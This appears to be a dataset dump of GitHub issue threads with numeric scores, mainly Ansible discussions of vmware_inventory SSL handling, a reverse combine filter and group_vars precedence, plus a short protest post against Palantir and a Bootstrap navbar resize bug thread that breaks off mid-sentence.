ansible/ansible/17811,0.07185866,ansible,ansible,Allow vmware_inventory to control acceptance of SSL certificates,602,3,2,0,0,"ISSUE TYPE  Bug Report  COMPONENT NAME vmware_inventory ANSIBLE VERSION CONFIGURATION OS / ENVIRONMENT SUMMARY ♠vmware_inventory` blindly accepts the SSL certificate at the moment - regardless of it being part of a genuine chain or a self signed cert. Convenient, possibly, but not the height of security. Really we should have an option to accept a certificate or not so people can decide their attitude to risk. STEPS TO REPRODUCE EXPECTED RESULTS Reject or accept connecting to vsphere over SSL based on an option. ACTUAL RESULTS Inventory script always connects, no matter what the certificate is. ",2,0,13,0,0,125,0,
ansible/ansible/46215,0.1385409735,ansible,ansible,Add a version of the combine-filter that merges in reversed order,3804,45,70,0,0,"SUMMARY I'd like to be able to use the combine-filter but merge in reverse order. ISSUE TYPE  Feature Idea  COMPONENT NAME No idea ADDITIONAL INFORMATION One common pattern that I return to when constructing Ansible roles is to have some variables for the role described (with defaults) in  and then apply some defaults or transformations to that data inside  (prefixing the variable with  to make it clear that the variable is internal and manipulated). Example defaults/main.yml vars/main.yml This allows me to define my variables in my inventory like this inventory/development/group_vars/database/vars.yml …while not having to put lots of -filters in my task files. Now to my problem. See the  definition above. If I could reverse the merge-order of combine I could define it like this instead vars/main.yml Which reads a lot nicer. I use the above approach when I want to override something in a list of objects (which comes up more seldomly) yaml _db_user_overrides   admin false _db_users &gt;-   {{ db_users | map('combine', _db_user_overrides) | list }} ♠ Solution(?) Either a -filter or a new key to the -filter would do. Maybe  or  (as in left-to-right merge).  Files identified in the description  lib/ansible/inventory lib/ansible/modules/files/file.py lib/ansible/modules/packaging/os/apt.py lib/ansible/parsing/utils/yaml.py lib/ansible/playbook/role test/integration/targets/apt/defaults/main.yml test/integration/targets/binary/vars/main.yml  If these files are inaccurate, please update the  section of the description or use the  bot command. click here for bot help   cc @friend click here for bot help   soo, why not just switch the variables? is the same as your example w/o requiring a new keyword  Is it though?  is a dict and not a list. Not sure what applying the  filter on a dict would do.  @friend Here's a test of your suggestion combine.yml  If there was a -filter that took input and produced a stream of  copies of it I could do something like this The replicate filter would work like this So that's another solution to my problem. /Mattias — who's aware that he's very focused on his particular problem right now ;)  I'll try to implement this as a filter-plugin in my local repository and see if I can get it all to work. Would you be interested in a PR then later?  Added a PR for this.  combine takes N dictionaries, all terms need to be dicts, it should not work if any is a list no matter the order. The issue here is your use of map more than the issue with the combine filter itself  Well... Also the code was based on your suggestion. No it's not. One might add support for my use case by extending  instead of , but there really isn't an issue with my use of map. I'm not trying to split hairs here. Rather I'm trying to communicate an issue with the way you communicate. It really is unnecessarily provocative. Please try to drop the attitude.  sorry, i might have phrased that better, its not that you are using map incorrectly, its that you are using map at all that is the issue here. This is a limitation of map, not combine.  Thanks! All good 😊 ❤️ I agree with your premise and I'll continue the discussion in the PR. I have some other ideas that might be helpful as well!  Files identified in the description None If these files are inaccurate, please update the  section of the description or use the  bot command. click here for bot help   I found a hacky solution for this use case First, combine each dict with the defaults (override with defaults). Then, zip these n ""defaults"" with each dict and finally map these tuples of dicts using combine. Example This is how you create a new users dict, with defaults applied  I've done lots of those. ♥ Eventually started writing my own filters that I put together with my playbooks. Mmmm, I love this! 😂♥ ",15,14,164,0,0,120,7,
ansible/ansible/9065,0.135844365,ansible,ansible,separate group_vars being overwritten when deploying to same host,36171,374,456,0,8,"Issue Type Bug Report Ansible Version ansible 1.6.1 Environment Mac OSX Summary If we have a hosts file [service1] www.host1.com  [service2] www.host1.com  and we have these group_vars group_vars/service1     database_host ""www.database.com""     database_port  3306  group_vars/service2     database_host ""www.differentdatabase.com""     database_port  3306  and we are running this playbook - hosts service1   remote_user root  the variables from group_vars/service1 and group_vars/service2 overwrite each other if we're deploying to the same server. This means service1 will get service2 groups variables and get the incorrect database host and port. to get around these, we've added DNS entries (aliases to www.host1-service.com) so our host looks like [service1] www.host1-service1.com  [service2] www.host1-service2.com  but this is highly error prone and is not ideal. What are some different methods to getting around this issue? (or misunderstanding of group_vars) The way I'm doing multi environmental deployments is like this inventory/stage/hosts inventory/stage/group_vars/ inventory/stage/group_vars/service1 inventory/stage/group_vars/service2  inventory/live/hosts inventory/live/group_vars/ inventory/live/group_vars/service1 inventory/live/group_vars/service2  Steps To Reproduce Summary describes how to reproduce this. Expected Results group_vars should not be overwritten by another group when sharing the same host Actual Results group_vars are overwritten by another group when sharing the same host  I'm also having this issue, it seems like the vars get parsed and attached to the host rather than the staying with the group. Steps To Reproduce Hosts file [aaa] host1 host2  [bbb] host2 host3  [aaavars] foo=aaa  [bbbvars] foo=bbb  Run a command on each group $ ansible -i hosts aaa -m shell -a ""echo {{ foo }}"" host1 | success | rc=0 &gt;&gt; aaa  host2 | success | rc=0 &gt;&gt; bbb  $ ansible -i hosts bbb -m shell -a ""echo {{ foo }}"" host2 | success | rc=0 &gt;&gt; bbb  host3 | success | rc=0 &gt;&gt; bbb  Expected results The variable  is asigned to the group  and should be output when running commands against group Actual results host2 outputs the variable from group  Have the same problem. Example ./group_vars/group1 ./group_vars/group2 hosts file So, when I'm trying to run playbook for group1 only, I'm getting this result ""name"" variable has a value ""group2-default"" but it`s expected to have a value ""group1"". Is there any workaround for this?  inventory vars get merged even if you are not using that group, last group merged wins --  Brian Coca  @friend Why does it work that way? Is this expected behaviour, or an actual bug?  You could have vars/service(1,2,3,...) files And pass service=1 as extra vars Then for the hosts your targeting in the playbook use the service variable, as well as which vars file you are importing We do a similar thing for importing vars based on an environment extra var  On Nov 26, 2014 312 PM, ""arianitu"" notifications@friend.com wrote  I have same issue on 1.8.4 today. Eventually, is this a correct behavior or not? Does anyone know the progress?  Hmm. Seems like the tags 'bug_report' are wrong here. This is not a bug but.. a feature -) So yes, it is correct behaviour. As @friend said, ""the vars get parsed and attached to the host rather than the staying with the group"" which is totally correct. Variables in different groups where the same hosts are member, only makes sense when those groups are in a parent-child relation, the child winning, and it's vars applied. If groups are at the same level, there is not really a deterministic way which one will win. At playbook time targetting a group actually only determines which hosts are in the run, it doesn;t change anything at variable level. The ansible way here would be to set database host and port in a list, and the iterate over it in tasks. @friend @friend I think this issue can be closed.  @friend Thanks a lot! I got it. I'll try without using group_vars.  closing as this is not a bug but by design, group vars get flattened per host and do not vary because of how you select the host  Anyone got a workaround for this? we can't use static vars in the playbook, as we need to differenciate between different environments (handles by different inventory files) and need to run with different variables, depending on the group run, even tough they are run on the same host as another group  Use a CNAME for the same hostname or an IP address.  This is the only workaround I found. The problem appears when you are using Ansible Tower, because you're wasting a license with such CNAME's. Ansible do not want to fix this bug calling it a ""feature"", but in fact it's a real bug that must be fixed. 28 Апр 2015 г. 1716 пользователь ""SkaveRat"" notifications@friend.com написал  It has been fixed but rejected.  annoying thing is that the ansible guide does recommend to group them by roles  if the same host has multiple roles with the same variables you can't use the group variables since you don't know which one will be used.  I still don't understand how to bind a variable to a specific host for a specific playbook. I want the ability to use the same template, but with different configuration values depending on the environment I'm deploying to. We're already following  by making different inventories for our different environments Why does this seem so difficult with Ansible? Is Ansible just bad at doing environment based deployments? Please provide a full example, because ""The ansible way here would be to set database host and port in a list, and the iterate over it in tasks."" does not make any sense to me. Where is the environment specified here? For example, I have an authentication service that has a variable called  for stage, and  for live. Do you want me to have 2 variables? Now it's difficult for me to feed that to a common template file. I need to add if else checks throughout my j2 file (and we went down that path, but it was too much duplication and we got rid of it.) I have not found any documentation that handles this case, and it seems like a thing that should not be difficult to do.  Here's how we do it AWS instance tagged as someapi prod playbook someapi.yml  hosts tagsomeapi{{ env }} gather_facts true user ec2-user vars_files  vars/aws_{{ env }}  tasks  fail msg=""Env must be defined"" when env is not defined roles someapi ...    Execution with extra vars ansible-playbook -vv someapi.yml -e ""env=prod"" roles/someapi/tasks/main.yml  name Include vars specific only to someapi. includevars someapi{{ env }}.yml  name Place config template src=config.j2 dest={{someapi_install_directory}}/configuration.properties ...   roles/someapi/vars/someapi_prod.yml authentication_db_host 192.168.2.4 roles/someapi/vars/someapi_stag.yml authentication_db_host 127.0.0.1 ... roles/someapi/templates/config.j2 authentication_db_host = {{ authentication_db_host }} ... HTH, --  Iain Wright This email message is confidential, intended only for the recipient(s) named above and may contain information that is privileged, exempt from disclosure under applicable law. If you are not the intended recipient, do not disclose or disseminate the message to anyone except the intended recipient. If you have received this message in error, or are not the named recipient(s), please immediately notify the sender by return email, and delete all copies of this message. On Fri, Oct 16, 2015 at 1242 PM, arianitu notifications@friend.com wrote  Can Ansible detect such cases and make a warning with a possible solution hint?  If I understand correctly how it works -- for future readers like myself who struggle to understand  Host groups in inventory files define groups of hosts. Group variables define what variables should be be set for the hosts in this group. When I specify a group to be used to play a playbook, this means to take all the hosts which belong to that group. Each play is played separately for each host -- there is no context which group is being deployed. Groups are used to group hosts and group vars -- to set common variables to those hosts. So if a host is mentioned in several groups and these groups have the same variable with different values, the host is told that because it belongs to the first group -- the variable for it is set to the group value; then because the host belongs to another group the same variable with a different value is set shadowing the previous value.   The main problem is that ansible merge variables even from groups I don't want to play right now. I don't need to check variables from group I'm not playing at this time. Maybe, the semi solution is to check for variables only that groups, which was scheduled to run playbook. вс, 17 Янв 2016, 2000, Victor Varvaryuk notifications@friend.com  This seems very counter-intuitive. I have an inventory which just has my Vagrant box in each group for testing purposes. But even when I run a playbook which just references a single group, Ansible is pulling in variables from the other groups too which is breaking my testing.  On 28 April 2016 at 1755, Philip Wigg notifications@friend.com wrote ​That is because the mental model you use to look at inventory is not the correct one.​ ​Do not look at the inventory as tightly coupled with playbooks. Inventory is pretty much a separate thing, where  hosts can be member of several groups, and as such be targetted from ansible​ (ad-hoc) or ansible-playbook (playbooks) by pointing to one of the groups that host is member of. resolving variables is done inventory-wide, whether you target a specific group, or the allmighty built-in 'all' group, doesn't change that variables are and inherited, resolved  and calculated by looking at all group definitions and all group variables that exist in the inventory.  HTH, Serge  I'm bumping into this too. In my case I have a role which installs vhosts. I set the details for the multiple vhosts as an array in my inventory for the server groups, in other words each group can have multiple vhosts. This works well, I define the vhosts for each group and everything seems neat and tidy. The problem comes up when the host is in more than one group, in that case the vhost array in the inventory is overwritten and the last group wins, so only half my vhosts end up being provisioned. An alternative would be to put the vhosts in the hosts instead of in the group, but that doesn't seem clean because I'll have to duplicate for all servers which are in the same group. Can anybody point me in the direction of a better way to do this or to work around it? I feel like I may be abusing the concept of roles or inventory by having my ""vhosts"" role accept an array of vhosts (a vhost is not exactly a ""role"" in the sense that you don't say to a server ""you are a vhost""). Can anyone offer a better way to do it or share their thoughts?  By the way, @friend, thank you for taking the time to respond to me - it was much appreciated and has clarified my understanding.  My solution is. [service1] host1 ansible_ssh_user=host1.com [service2] host2 ansible_ssh_user=host1.com  This is so stupid. I just spent many hours trying to debug a variable issue, only to discover that it was because of some stupid design philosophy (this). At there very least, there should be a warning when multiple group_var files are loaded for the same host.  This i very anoying to have group_vars loaded randomly. It make impossible to have inheritance in a such case all &gt; datacenter &gt; environment (integ, devel, prod) &gt; application &gt; host It's very easy to do with puppet hiera but with ansible it's a pain, and, when you have &gt; 100 playbooks/roles to maintain, load variables explicitely is not a must have because you should maintain a vars_file + a group_vars file for the same function. Maybe having a tag in the file (vars_priority) or use the filename to fix the loading order could be good (like apache for example), example  all.yml 10_datacenter_a.yml 10_datacenter_b.yml 20_env_production.yml 40_app_gitlab.yml  then gitlab load group vars per name.  I'm really happy to see that I'm not alone in this none sense! Groups vars should do apply the HIS group of hosts period. How in the world the --limit directive should be explain than? The natural way of thinking is  ok I ""limit"" this play book to host in THAT group so THAT group of vars gets pick up!!!! Not variable define in other groups for that same host, that doesn't make any sense! I hope this get fix and in the mean time, I fallback to use multiple DNS entry for the same host.  Just spent several hours banging my head on the table trying to get around this issue.  With the amount of chatter this issue is getting I'm really surprised Ansible (or Red Hat) is allowing this to continue.  Why rely on the group_vars abstraction to merge vars and determine what is needed in the first place? I can't think of a good reason not to explicitly define and include vars (simplest example is included above in the thread) --  Iain Wright This email message is confidential, intended only for the recipient(s) named above and may contain information that is privileged, exempt from disclosure under applicable law. If you are not the intended recipient, do not disclose or disseminate the message to anyone except the intended recipient. If you have received this message in error, or are not the named recipient(s), please immediately notify the sender by return email, and delete all copies of this message. On Tue, Sep 27, 2016 at 1153 AM, Jason Hane notifications@friend.com wrote  Part of the issue is that it's not immediately clear that's how Ansible parses variables.  One would think (as evidenced by the number of people having this problem) that assigning a host to a group, and running only that group, would inherit the variables for only that group and not of all of the groups that host is in. Running all hosts is a different story but at least then it should be a clear assumption that Ansible would grab all variables for all groups that host is in.  Ansible should either do a better job making those assumptions clear or provide a flag that enables this behavior.  needed in the first place? That's EXACTLY the point of an abstraction! If the tool let me abstract my environment in different groups and then by applying clear rules of inference deduce which variables should be use, why not use it?!? So there's 2 problems here  The rules and not clear or the abstraction is not working. Otherwise, explain me the purpose of groups_vars if I need to explicitly define and include vars? I'm must say that the documentation do not mention this specific case of same host been included in multiple group_vars. But this case is very real in host where multiple instance of service exist (ex. apache). I really hope this problem being solve soon.  We have found a way to solve our app/env problem with variables inheritance by cross defining variables between groups using a prefix. for example app_collectd.yml collectd_host ""{{ env_collectd_host }}"" env_production.yml env_collectd_host 1.1.1.1 then it's now not a problem, we have a clear app variables + env variables using cross calling variables  I'm coming from Puppet-land where doing abstraction and code reuse is simple and clear.  Maybe I don't understand correctly how Ansible approaches this so if there is a better way  that doesn't involve group_vars I'm all ears.  What I don't want to have to do is maintain another set of variables for each host or group to specify where it should be getting its variables.  To me that should be the responsibility of the framework.  This is the beauty of hiera in Puppet.  @friend [service1] host1 ansible_ssh_user=host1.com [service2] host2 ansible_ssh_user=host1.com can you explain it in detail?  One more victim here. Anyone figure out a good solution for the following scenario? Let's say I have a list of web applications (app-a, app-b, app-c). And there are 4 hosts in 2 DC for DR/Load-balancing. I want to use ansible to simplify deployment. My first instinct is to use group vars, obviously I failed, but what alternative Ansible provides? inventory http_port 8081 app-c  host {{app-name}} tasks  # deploy application with given {{http_port}}.... ♠`   This is what I do to get around it  @friend Thanks, that certainly points to a direction I wasn't aware of.  However, I am now more incline to use roles for code reuse, and declare variables directly in playbook. Even though that means I will have one playbook per app, but by declare variable right next to the role which will use it, make the entire config much easier to understand.  @friend Thanks, this workaround is brilliant.  You saved me.  @friend Genius! I'm so surprised that this is even an issue.  I'm running into it because I have a single role I use with multiple inventory groups that have associated group_var files.  In QA/Prod, this is not an issue, because each inventory group has different servers.  But for integration level environments, we tend to smash everything together on to single servers (which is why I'm seeing this issue). Following hanej's advice, I modified my playbook yml to just explicitly load the group_var file♠hosts publish vars_files  group_vars/publish.yml`   ""This is so stupid. I just spent many hours trying to debug a variable issue, only to discover that it was because of some stupid design philosophy (this). At there very least, there should be a warning when multiple group_var files are loaded for the same host."" Just to update this ""ISSUE""/""LIMITATION"" OK, we can use a workaround to eliminate the conflict, ( with host ansible or other way ) but the best way should be to purpose variable in the ansible.cfg to define  ""enclose group_vars"" or ""merge group_vars""  I can't use group_vars just for this reason.  We have multiple hosts in multiple groups (DC, environment, application, etc) and we have no control over how the variables are read.  Coming over from Puppet using Hiera this is a huge deal.  In my opinion, Ansible should adopt something like Hiera using the ""roles and profiles"" pattern where you can specify the order of how variables are consumed based on facts or groups.  I kind of do this now using the approach above. For instance, if you have a host in a role called ""/Linux Hosts/Applications/Java/Website"" you should be able to inherit variables from Linux Hosts (global level variables like sysctl, DNS, NTP, etc), Applications (global application level variables), Java (java specific variables like JDK version, JAVA_HOME, etc), and Website (variables related specifically to the website application).  The further you go down in the tree the more specific the variables become, which can override the variables higher up. Using Ansible for event driven or adhoc runs is great and works very well, however I'm finding that using Ansible for configuration management is not as clean or easy to use as Puppet and Hiera mostly for this reason.  2 years later, I'm still receiving a steady stream of e-mails on this issue (it's also one of the most commented issues in this github.) Do the Ansible maintainers still feel like the current behaviour is correct, even though it's very unintuitive? You guys need to seriously document on how to do configuration management with Ansible because anyone trying to do application deployment with this project is having a terrible time. We've decided to stop using Ansible entirely. It sucks at configuration management, period. Good luck with the project.  Yeah, just ran into the same problem when configuring the deployment process for config files for different environments, while testing on the same host. I'm going to adopt the whole {{ app-name }}-{{env}}.yml method proposed by @friend , but would love for the group_vars behaviour to at least be configurable.  Happy I found this issue after banging my head against the wall for countless hours... And I'm extremely surprised of the maintainers dismissive attitude regarding this bug by calling it a ""feature"", it's stupid beyond recognition. I'm trying to set up a generic deployment playbook/role using a dynamic inventory. The inventory output looks like this Unfortunately there can be multiple applications on a single host. The whole point by using a dynamic inventory evaporates if the group vars are 'randomly' mashed up and returned instead of  inherit the variables for only that group which I'm running --limit with I tried @friend workaround by implementing the json like this _""hosts"" [""host2 ansible_host=host1.example.com"", ""host2 ansiblehost=host2.example.com""] but Ansible clearly don't understand that trying to ssh to host1 ansible_host=host1.example.com Anyone else facing the same problem, and if so have a possible workaround? I could pass the port and pool variables on the command line as they precedence, but then I have to do some ugly lookup before.  Was having a great time with Ansible until hitting this bug. I had a perfect abstraction that would allow configuration of the same apps on a multi-tiered environment, and also on an all-in-one test environment - alas, I was wrong. What seemed like one of the most powerful features of Ansible doesn't work like everyone would expect it to. Please, lets get this fixed.  Spent hours banging my head on the table trying to get around this issue. Please fix this issue.  This ""feature"" wasted the better part of my day. Not amused. @friend Thanks for the rather elegant workaround. We're now setting an  variable in our  files to the name of the environment. In our playbooks we then do this  I know that it's been 2.5 years and that Ansible will probably never look at this, but I'm just going to add my frustration with this. Why allow users to put a host in multiple groups if you can't use the groups separately?  That's my problem with Ansible devs. Looks like they think only about themselves. They could at least try make the frustration less issuing some warnings. They instead prefer to spit.  We filter out closed issues and don't see comments on them, but someone pinged me to respond to some of these questions. If you want attention from devs the mailing list or IRC are better conduits than closed tickets. Ansible looks at groups as properties of a host. For example,  you can have a host be part of webserver group (to install a webserver reqs) and part of the northeast_datacenter group (so you know the network gateway, ntp and dns servers to set) also part of the dev_group to install dev tools and point to the non-production database, etc, etc. You CAN use the groups as a way to target hosts but that does not mean the other 'host properties' disappear. I am in the 'males' group and in the 'programmers' group, just because you 'select me' as a programmer I do not stop being male. In the end this is a design decision (not a bug) on how to tackle groups, a way to classify and add properties to hosts. I know other tools use them differently but that is not a reason to change how they work in Ansible, as there is no uniform way ALL other tools use groups, many others look at them this way many don't. This has the limitation of not being able to reuse variable names and only have the 'current group apply' but it  has the advantage of always seeing the bigger picture of how the host is defined and makes conflicts easy to spot or resolve. In most of the cases above a use of vars_files or include_vars seems more appropriate than setting up as groups, when talking about application specific variables. Doing include_vars on group_vars ... well that is not how we designed it, but if it works for you ... the caveat is that you are 'double loading' as group_vars are automatically pulled in, this can lead to performance issues on large inventories.  We recommend more specific,  or similar with include_vars. I hope this clarifies why groups work the way they do in Ansible and why that is different than 'another specific tool', let me know if there is anything I can add to our docs  to clarify and avoid frustration. I would love to accommodate everyone's way of working, Ansible is very flexible in some areas, but not in this respect and I don't see a good way to make it so nor a sane way to share playbooks afterwards. If I'm wrong, I look forward to your pull request.  @friend is it possible to detect cases when the group vars are being used in a strange way (sorry, cannot formulate this better -- haven't used this for a long time) and make warnings to help users save their time?  @friend What's unclear to me, and I think most of the rest of the commentators on this issue, is what value the Ansible team is looking to preserve by keeping group_var precedence/resolution the way that it is. Can you give an example of a case which is satisfied well by the current solution but would cease to be so if, say, group_vars are only loaded for the groups selected for a given play, rather than for the entire inventory? It seems quite easy to come up with examples which are broken by the way that it is now.  I understand @friend's point as we use it that way too.  My biggest frustration with Ansible is it works mostly good for either configuration management or ad-hoc workflows.  It doesn't do a great job of either but it's getting better and it has plugin support which I think I will be using to make another issue I have with it better.  Most days I still miss Puppet solely for configuration management... Probably the best use case for group_vars is multiple datacenters.  Let's say your inventory file looks thusly You could use group_vars to set datacenter specific variables that would be inherited by all hosts in that datacenter. dc1.yml dc2.yml Using group_vars like this is fine until you need to merge or override a variable in another group_var file.  This is another case where group_vars breaks down.  There's no way to set the order in which variables are read in group_vars.  A hierarchical layout (like Hiera) that can be determined by facts and not by groups for things like environmental variables comes to mind here but I digress. From my perspective, this use case is mostly good for straight configuration management but it's not so great at deployments or ad-hoc scripts.  This is why I would love to see a switch to disable this feature for certain playbooks where you don't want to do this.  @friend I'm not sure how that example breaks by the design change I suggested in my previous comment? Given the inventory you've listed, if I  Any  you'd write against that inventory would have to be fairly contrived in order to make it break when only  and  were broken. I agree that deployments are an issue. Multi-tenanted deployments, specifically. I have two concerns with the way things work now First, lack of configuration namespacing. Specifically, if I'm maintaining configuration for some applications in a multi-tenanted environment, how do I ensure that someone maintaining a different app which happens to run on the same machines isn't going to add a variable name which conflicts with mine, or that I won't add one which conflicts with theirs? Second, the case everyone keeps talking about here. I'd expect that with the below inventory, I'd never wind up with files written to  when I run , and that files would never be written to  when I run These two issues are bad enough on their own, but in a large company where many people in different timezones might be editing the same inventory, the current solution seems more than a little risky. Example inventory. app1_staging.yml app1_prod.yml  Don't know if the edit worked to adjust the notification, by my last comment was meant to be directed to @friend.  @friend You asked for an example of using group_vars that satisfies the current loading method but breaks if only using the immediate groups.  I provided that with the datacenter example.  If Ansible doesn't load variables for all groups, then you cannot set variables, for example, at a datacenter level. I believe this should be a toggle in ansible.cfg or on the command line so you can specify how to load group_vars so it doesn't break the existing use cases.  We have multi-tenant environments here and used to get bit by this until I stopped using group_vars. I'm not sure if you've heard of the roles and profiles pattern but it's a really good read and I highly recommend this approach if you're using any kind of configuration management tool.  It was written for Puppet but it applies for all tools.  You probably wouldn't use this for deployments or ad-hoc stuff but for straight configuration management it's great.  I use docker hosts so it is quite normal to have different instances of containers in different environments spread across hosts and this bit me. Thanks to @friend for the workaround and I would also add group vars do not work as advertised and seem to be broken by design. My workaround is to define a play as follows Put a vars directory in the playbook dir with group1.yml, group2.yml in there.  I just joined victim list today after 1 hour debugging and fortunate enough to found this post. I think it's only documentation problem, no one will complain if it's clearly noted in here  fact that variables are associated with hosts, and groups is just a convenience way to set variables to all hosts belong to it. Variables will be overriden if the same host is used in multiple groups.  plus one This issue affects our software team.  Also encountered this issue when deploying several groups to the same hosts. Needed a way to vary a port for each group and use that port in a template which iterates though hosts of groups. (haproxy)  Unfortunately we also ran into this issue today. Same story, Though we have a generic ""tomcat"" rol we vary the variables like port numbers based upon the group that is used. However several tomcat instances can be deployed to the same physical servers so we created multiple groups in the inventories that contain the same set of servers. However this approach doesn't seem to work. I have no idea yet how to design this. I cant create wrapper roles that have the variables because some of the variables are actually specific to the inventory. Think for example a database password oid.  I recently found this which eased my pain with this issue  allows merging of variables no matter where they were defined, so you can merge two dicts/lists in two different groups for example, as opposed to one group winning and overwriting the variable defined in the other groups as is the current behavior. The plugin only works with Ansible 2+. A good article explaining the concept and the use case can be found here.  We recently come into this issue as well. We have multiple applications running on a single host as different users. For instance We have no way to specify  with vars properly, neither with  nor . The latest definition always wins in both cases. Our current workaround is to define multiple plays with different  in the playbook  @friend suggested a smart way above to workaround this So now each host has a unique name in the inventory. Not a big fan to put host vars in inventory, but this is the best workaround I have seen so far.  @friend I think you are missing the points of hostvars and directives should work as long as you dont set ansible_user. The groups are a property of the host, not an entity to themselves.  There was a proposal to make it possible to write proper plugins for inventory management. I suspect now that this proposal was closed/finished, it should become possible to implement a dynamic inventory plugin which works around this point of confusion.  Going to plus one to question the ansible design here. In the real world, many different applications can run on the same host. Scoping group_vars at the host-level simply doesn't cover this use-case. Just as a thought experiment  Let's assume that the default behavior was modified so that running ansible-playbook with the ""-l"" option uses the group_vars child file (if it exists).  You could still handle the ""datacenter"" use-case that was mentioned through parent groups. All that would change is that the ""named"" child group for a host match would win the inheritence battle, instead of the ""last"" child group for a host match.  Making this small change would make hundreds of DevOps-y people happy, and would hurt nobody.  From my previous comment, see  for a potential avenue to allow more pluggable behaviour here.  Can't believe that Ansible do not fix or reply on this issue.  It took me a few hours to debug.  Can't believe that Ansible do not fix(give hints, warning) or reply more on this issue.  It took me a few hours to debug.  I encountered this as well.  One approach was to use nested variables.  So take inventory group my_app_servers for example, and it lines up with the file my_app_servers.yml inside your group_vars, and you've got more than one application to manage on a common host.  I nested them like this Example my_app_servers.yml application_env   - application1   - application2  application_environments   application1      app1_port 8080     app1_conf_dir ""/somedirectory/conf""     app1_logs_dir ""/somedirectory/logs""     app1_app_install_name app1prd     application2       app2_port 8081      app2_conf_dir ""/somedirectory/conf""      app2_logs_dir ""/somedirectory/logs""      app2_app_install_name app2prd  In your main.yml, define a loop, and iterate over the nested variable list like this, with_items ""{{ application_env }}""   loop_control     loop_var application_env_item Then in your tasks, you can grab the nested variable that you want, to execute something. {{application_environments[application_env_item]['app1_app_install_name']}} (if you can pull one var out of that list, you can get the rest.). Hope that helps.  This issue (#9065) was closed back in 2015. Same #6538. Same #6666. And many more.  Here is 2018, 4 years after many issues were open, and apparently it's more hot than it was at the beginning, and everyone lost hours due to a counter-intuitive design. This sounds like an alarm on the design. IMHO this needs to be reviewed and fixed. If everyone will continue use hacks and make ansible code ugly due to conditional var file includes, or inventories like ""[service1] host1 ansible_ssh_user=host1.com"", or additional libs to fix core functionality, ansible will be less attractive. IMHO these hacks don't seem aligned with the ansible's ""Simple IT Automation""  motto. @friend -&gt; What should be the trigger to have someone reevaluate PR #6666, or something similar that ""just works intuitively""?  I think group_vars themselves should be able to be prioritized.  Hiera for Puppet got it right.  You can specify how lookups are done based on facts or groups.  Let the end user be able to customize how group_vars should be processed and provide a mechanism to easily see the order in which Ansible is applying those variables.  FYI, we dont normally see notifications on closed issues, responding here because someone pointed me at this, I'm also going to lock so people don't keep commenting in a forum maintainers won't see. @friend i think you want  and  configuration. @friend  open a proposal, but this is about a fundamental focus of each diff app. Ansible focuses on a task for a host, the other tools you mention focus on a much more complex structure. For ansible 'groups' are just a property of a host, not a principal entity,  the other tools focus on groups as 'the main context' and everything else is added onto that. I don't see either approach as 'wrong', just different. Trying to make Ansible work in such a way will break the simplicity paradigm, focus on A host and A task for what is just an organizational focus and transposing what i see as the 'accustomed way of thinking'  people bring from other tools. I would argue that this is just a perception on data organization and habits, but that is just my opinion. Feel free to submit a proposal, if you convince and gain enough traction with maintainers you might get the change you want, I just don't think it is a change we need. ",112,101,1420,0,0,613,41,
palantir/blueprint/2875,0.56854236,palantir,blueprint,Stop using my tools,279,5,3,0.5454545454545454,0,"Apologies to any contributors who aren't employees of Palantir. But to those that are Please find jobs elsewhere and stop helping Palantir do horrible things. Also, stop using my tools (such as Lerna), I don't support you, and I don't want my work to benefit your awful company. ",0,0,11,0.2727272727272727,0.09090909090909091,9,0,
twbs/bootstrap/11243,0.0661096865,twbs,bootstrap,Navbar issues,12612,204,106,0,4,"The default navbar ( act a little bit weird when  I click dropdown (keep it opened) and then resize the browser until the navbar-toggle button appear, click it, open the dropdown and then maximize the browser. after those step, I can't open the dropdown on navbar default state..  What browser are you using? Everything works well on Chrome.  I'm using Google chrome. On my previous bootstrap 3 files, everything works fine, Until I sync it today and replace it (both unminified css &amp; js file). I'm glad I have a backup bootstrap files )  This issue exists for us as well. Same browser.  I think that found the thing causing the bug. No one of browsers can works in all test cases, but this is due to the viewport (dropdown forgets the place where should appear). @friend Please, don't try to kill your browser. This test case is too aggressive.  I've got a trick to avoid the bug appearing when we maximize the browser. default bootstrap markup  the bug appear when we maximize the browser and we have  I've tried to change  class to . and it's works. bootstrap navbar is back to normal. in the end, we would have this markup when our browser is maximized  anyway, this is just a trick. my javascript skill is not yet able to fix this.. ( you can use  for resize event or anything else to manipulate the markup. hope this can solve our problem )  we have the same issue on our site and fixed it by closing the collapse dropdown after resizing the browser through adding this javascript code we also use a good plugin for resizestop event  Or try to add  When I add @friend (min-width 768px)  {  .navbar-collapse.in{ overflow-yvisible;} } ""navbar-right"" or ""pull-right"" doesn't work anymore. The solution of Nugrata works fine  @friend This problem happens for me using the latest Google Chrome. The finer points of this bug are not about the original navbar drop down but the collapsed navbar drop down. If that is up when you re enlarge the window it's fine. The bug only occurs after clicking on the little three lined icon if you then re enlarge the window while the revealed stacked navbar is still down.  Is this now the definitive thread and is there a definitive answer?  Again, sorry @friend. This is an issue about Chrome's viewport resize, and things like this happens on many sites, undependent of framework (like Bootstrap). So, I think that this issue can be closed. How to fix it? Don't play games with your browser's viewport.  @friend I disagree. If I write my website using the bootstrap system and any visitor of my site has a good reason to shrink the window for a while and later regrow the window they have a right to be alarmed and not accused of playing games with their viewport. It is a bug, and even though there may be workarounds, although it's not clear to me what the definitive workaround is, it's not fixed until it's fixed to everyone's satisfaction in a future version of bootstrap.  @friend That's all about viewport. You should report bug in Chrome bug tracker. ;)  I think we have a misunderstanding here. The bug I'm referring to is the one I described in the thread that has been closed because it was assumed to be the same a this one. That bug happens exactly the same in Safari, Firefox and Chrome. It is not just a Chrome issue. It is more likely a bootstrap issue. Try the link above to issue #11603 and read my description of the issue. If these issues are at cross purposes perhaps we need to separate them. I originally assumed when it was pointed to me that my issue was a duplicate and that this issue was the same hence why am commenting here now. I think this is definitely a bug in bootstrap and not just a browser issue given that three distinct browsers repeat the same behaviour.  I'm not going to close this issue.  @friend I don't know, but it looks like viewport issue (happens when resize window). I know that it can be fixed, but I don't think it's issue directly within Bootstrap.  @friend I didn't think you were going to close this thread. I was referring to the closure of #11603. @friend If you can show me a solution that you think works I'll try it out and see.  i don't have complete solution. I'm just avoiding window resizing games. smile  @friend I'm not finding your suggested solution that clear. I'm new to bootstrap. Would you mind perhaps expanding on what exactly to do and where in order to fix this problem. Right now I can't see the forest for the trees.  @friend It's not about what we're doing. We can't avoid what our web site clients are going to do. They are the ones who will get annoyed with our web sites and that's what concerns me. We can't in all seriousness post a directive on our home pages for users to not play silly whatsits with their windows.  I added  as a possible solution. But @friend mentioned this will break ""navbar-right"" and / or ""pull-right"".  What I thought is our problem come when we enlarge our browser but the  class within  is messing the navbar. so that  class got my attention. let's take a look the css file for a while.. I've 